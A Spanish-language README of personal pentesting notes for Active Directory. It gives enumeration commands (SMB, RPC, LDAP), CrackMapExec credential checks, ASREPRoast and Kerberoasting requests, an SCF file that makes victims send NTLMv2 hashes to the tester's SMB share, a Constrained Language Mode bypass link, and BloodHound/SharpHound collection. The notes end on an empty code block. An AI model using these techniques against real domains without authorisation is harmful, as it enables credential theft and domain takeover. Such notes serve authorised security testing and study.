# Pentesting Active Directory
Este repositorio está dedicado a recopilar y organizar mis notas sobre pentesting enfocado en Directorio Activo. Aquí encontrarás información detallada, técnicas, herramientas y procedimientos utilizados durante las pruebas de penetración en entornos de Directorio Activo. 
## Enumeración de protocolos
### SMB
Listar recursos compartidos en red
```bash
smbclient -L <dc> -N
```
Listar recursos y privilegios sobre ellos
```bash
smbmap -H <dc> -u 'guess'
```
Listar las ACL sobre los recursos compartidos
```bash
smbcalcs "//<dc>/recurso_compartido" -N
````
### RPC
Listar usuarios validos en el DC
```bash
rpcclient -U "" <dc> -N
enumdomusers
```
### LDAP
Enumerar el dominio
```bash
ldapdomaindump -u 'usuario' -p 'contraseña' <ip-dominio>
```
## Probar credenciales
### CrackMapExec
```bash
crackmapexec <servicio> <ip> -u 'Usuario' -p 'Contraseña'
```
Los servicios mas comunes son smb, winrm y rpc.

## Crear monturas de archivos compartidos para examinarlos con mas movilidad
```bash
mount -t cifs "//<dc>/<recurso_compartido>" /mnt/montura 
```

## Atacar Kerberos

### ASREPRoast Attack
Solicitar TGT de ususarios validos
```bash
GetNPUsers.py <dc.local>/ -no-pass -usersfile usuarios.txt 
```
### KerberoAsting Attack
Solicitar un TGS
```bash
GetUserSPNs.py <dominio>.local/user:pass -request
```

## Conseguir Hashes NTLM v2
### SCF files
Primero debemos montar un recurso compartido con impacket
```bash
impacket-smbserver <recurso>  $(pwd) -smb2support
```
Luego creamos un archivo con terminación .scf con el siguiente contenido:
```bash
[Shell]
Command=2
IconFile=\\<mi-ip>\<recurso>\icono.ico
[Taskbar]
Command=ToggleDesktop
```

## Bypass CLM
El constrained language mode es una restriccion que no nos permite utilizar todas las funcionalidades de powershell

Verificar que estamos en el clm
```powershell
$ExecutionContext.SessionState.LanguageMode
```
Si la salida es ```ConstrainedMode``` podemos utilizar el siguiente repo para bypassear https://github.com/padovah4ck/PSByPassCLM


## Reconocimiento y Escalacion de privilegios
### Bloodhound
BloodHound recolectara información de los ususarios y nos mostrar vias potenciales para convertirnos en domain admins
#### Sin acceso al sistema
```bash
bloodhound-python -c ALL -u 'usuario' -p 'contraeña' -ns <ip-dominio> -d <dominio>.local
```
#### Con acceso al sistema
El nuestro sistema 
```bash
wget https://raw.githubusercontent.com/puckiestyle/powershell/master/SharpHound.ps1
```
Luego enviamos el SharpHound.ps1 al sistema del dominio y lo ejecutamos con powershell
```poweshell

```


